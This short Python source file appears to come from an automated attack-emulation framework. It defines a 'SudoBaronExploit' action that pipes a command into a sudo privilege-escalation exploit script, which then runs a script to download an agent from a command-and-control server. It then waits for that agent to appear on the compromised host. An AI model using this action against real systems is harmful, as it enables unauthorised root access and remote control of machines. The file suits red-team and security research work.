import asyncio

from incalmo.models.command_result import CommandResult
from incalmo.core.actions.low_level_action import LowLevelAction
from incalmo.models.agent import Agent
from incalmo.core.services.config_service import ConfigService
from incalmo.core.models.events import Event


class SudoBaronExploit(LowLevelAction):
    def __init__(self, agent: Agent):
        server = ConfigService().get_config().agent_c2c_server
        command = f"echo '/bin/bash downloadAgent.sh {server}' | python3 sudo_baron_exploit.py"
        payloads = ["sudo_baron_exploit.py", "downloadAgent.sh"]
        super().__init__(agent, command, payloads)

    async def get_result(
        self,
        result: CommandResult,
    ) -> list[Event]:
        # sleep to allow for the agent to get to the new host
        await asyncio.sleep(10)
        return []
